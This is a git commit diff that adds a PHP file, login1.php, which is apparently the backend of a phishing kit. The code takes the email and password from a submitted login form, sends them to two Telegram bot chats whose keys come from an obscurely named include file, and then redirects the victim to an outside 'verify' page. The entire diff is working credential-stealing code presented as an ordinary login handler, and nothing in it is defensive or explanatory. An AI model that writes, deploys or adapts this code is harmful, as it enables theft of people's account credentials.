cc0be8ced849ab1a85adf37081956a6ef8fad32d
brainandrews <111882964+brainandrews@users.noreply.github.com>
2022-12-13 17:15:04 +0800

    Update login1.php
    Signed-off-by: brainandrews <111882964+brainandrews@users.noreply.github.com>

--- public/login1.php
+++ public/login1.php
@@ -1,1 +1,25 @@
 
+<?php
+$datum = date('d-m-Y / H:i:s');
+
+include 'Frank420jsxxnxxxsjmsksksjsjsjsjsksksks-sksk.snsnssjsjdhsiafran.php';
+$ip = getenv("REMOTE_ADDR");
+$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
+$message = "[link: $link ]\r\n";
+$ip = $_SERVER['REMOTE_ADDR'];
+$hostname = gethostbyaddr($ip);
+$send = $email; 
+$send = $email2; 
+$message = "THANKS Salary\n";
+$message .= "email : ".$_POST['email']."\r\n";
+$message .= "password : ".$_POST['password']."\r\n";
+
+file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
+file_get_contents("https://api.telegram.org/bot".$api2."/sendMessage?chat_id=".$chatid2."&text=" . urlencode($message)."" );
+
+
+
+HEADER("Location: https://privacynorthlane.netlify.app/verfiy.CruiseShipID");
+
+
+?>
